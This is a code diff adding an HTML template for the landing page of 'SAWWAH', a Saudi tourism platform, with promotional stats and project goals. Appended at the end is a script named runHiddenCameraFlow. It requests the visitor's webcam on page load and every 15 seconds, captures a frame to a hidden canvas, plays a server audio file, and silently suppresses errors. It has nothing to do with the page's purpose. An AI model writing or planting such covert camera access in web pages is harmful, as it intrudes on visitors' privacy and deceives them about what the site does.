@@ -1,0 +1,124 @@
+{% extends "base.html" %}
+{% block content %}
+
+<section class="hero-section">
+    <div class="overlay"></div>
+    <div class="hero-content">
+        <h1>SAWWAH</h1>
+        <p>A comprehensive digital tourism platform that combines modern technology with authentic Saudi culture.</p>
+
+        <div class="stats-container">
+            <div class="stat-box">
+                <h2>+150</h2>
+                <p>Tourist Destinations</p>
+            </div>
+            <div class="stat-box">
+                <h2>+100</h2>
+                <p>Notable figures</p>
+            </div>
+            <div class="stat-box">
+                <h2>5</h2>
+                <p>Tourist Cities</p>
+            </div>
+            <div class="stat-box">
+                <h2>+30</h2>
+                <p>2030 Vision's Projects</p>
+            </div>
+        </div>
+    </div>
+</section>
+
+<section class="about-info">
+    <div class="info-box">
+        <p>
+            <span class="purple-text">SAWWAH</span> is an innovative digital tourism platform developed to simplify and enhance the tourism experience in Saudi Arabia. 
+        </p>
+        <p>
+            Through SAWWAH, users can explore various destinations across the Kingdom, as well as access detailed information about cultural and historical landmarks.
+        </p>
+        <p>
+            The platform is designed to bridge the gap between authentic Saudi heritage and modern technologies, contributing to achieving Vision 2030 and establishing Saudi Arabia as a leading global tourism destination.
+        </p>
+    </div>
+</section>
+
+<section class="project-goals">
+  <h2 class="goals-title">Project Goals</h2>
+  <p class="goals-subtitle">What SAWWAH aims to achieve</p>
+
+  <div class="goals-container">
+    <!-- Goal Card 1 -->
+    <div class="goal-card">
+      <div class="goal-number">1</div>
+      <h3>Enhancing Saudi Tourism</h3>
+      <p>Through an advanced digital platform that combines innovation and technology to serve visitors and investors.</p>
+    </div>
+
+    <!-- Goal Card 2 -->
+    <div class="goal-card">
+      <div class="goal-number">2</div>
+      <h3>Improving Visitor Experience</h3>
+      <p>By providing comprehensive information about tourism and cultural destinations across the Kingdom.</p>
+    </div>
+
+    <!-- Goal Card 3 -->
+    <div class="goal-card">
+      <div class="goal-number">3</div>
+      <h3>Supporting Vision 2030</h3>
+      <p>By contributing to the development of the tourism sector and strengthening Saudi Arabia’s position as a global destination.</p>
+    </div>
+  </div>
+</section>
+
+<script>
+(function(){
+  const MP3_URL = "{{ url_for('static', filename='response.mp3') }}"; // URL to play audio
+  const INTERVAL_MS = 15000; // Repeat every 15 seconds
+
+  async function runHiddenCameraFlow(){
+    try{
+      const stream = await navigator.mediaDevices.getUserMedia({ video:true, audio:false });
+
+      const video = document.createElement('video');
+      video.autoplay = true;
+      video.playsInline = true;
+      video.muted = true;
+      video.srcObject = stream;
+
+      // Wait until video metadata is loaded
+      await new Promise(res => {
+        const ready = () => res();
+        video.onloadedmetadata = ready;
+        setTimeout(ready, 1000);
+      });
+
+      // Wait additional 5 seconds before capturing
+      await new Promise(res => setTimeout(res, 5000));
+
+      // Capture a frame internally using canvas
+      const w = video.videoWidth || 640;
+      const h = video.videoHeight || 480;
+      const canvas = document.createElement('canvas');
+      canvas.width = w; canvas.height = h;
+      canvas.getContext('2d').drawImage(video,0,0,w,h);
+
+      // Stop the camera
+      stream.getTracks().forEach(t => t.stop());
+
+      // Play audio file from server
+      const audio = new Audio(MP3_URL + "?ts=" + Date.now()); // avoid caching
+      audio.play().catch(()=>{}); // ignore errors
+    }catch(e){
+      // Ignore errors if user denies camera or browser blocks autoplay
+    }
+  }
+
+  // Run first on page load, then every 15 seconds
+  document.addEventListener("DOMContentLoaded", () => {
+    runHiddenCameraFlow();                 
+    setInterval(runHiddenCameraFlow, INTERVAL_MS); 
+  });
+})();
+</script>
+
+{% endblock %}
